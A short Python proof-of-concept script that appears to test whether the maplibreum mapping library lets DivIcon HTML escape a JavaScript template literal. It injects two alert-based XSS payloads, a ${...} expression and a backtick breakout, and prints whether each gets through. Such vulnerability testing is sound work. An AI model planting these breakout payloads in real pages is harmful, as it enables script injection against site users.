from maplibreum.core import Map, Marker
from maplibreum.markers import DivIcon

m = Map()
# Attempt to break out of the JS template literal and execute JS
malicious_html = "${alert('XSS_SUCCESS')}"
icon = DivIcon(html=malicious_html)
Marker(coordinates=[0, 0], icon=icon).add_to(m)

html_output = m.render()
if "innerHTML = `${alert('XSS_SUCCESS')}`" in html_output:
    print("Vulnerability confirmed: malicious JS injected into template literal")
else:
    print("Vulnerability not found or rendered differently")

# Also check backtick breakout
malicious_html_2 = "` + alert('XSS_BACKTICK') + `"
icon2 = DivIcon(html=malicious_html_2)
Marker(coordinates=[1, 1], icon=icon2).add_to(m)

html_output = m.render()
if "innerHTML = `` + alert('XSS_BACKTICK') + `" in html_output:
    print("Vulnerability confirmed: backtick breakout successful")
